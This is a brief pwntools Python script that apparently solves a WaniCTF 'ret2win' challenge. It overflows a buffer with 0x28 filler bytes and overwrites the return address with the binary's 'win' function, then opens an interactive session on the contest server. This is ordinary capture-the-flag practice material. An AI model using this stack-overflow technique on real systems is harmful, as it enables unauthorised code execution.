from pwn import *

target = ELF('chall')

with remote('ret2win-pwn.wanictf.org', 9003) as r:
    payload = b''
    payload += b'A' * 0x28
    payload += p64(target.symbols['win'])
    r.sendlineafter(b'your input (max. 48 bytes) > ', payload)

    r.interactive()
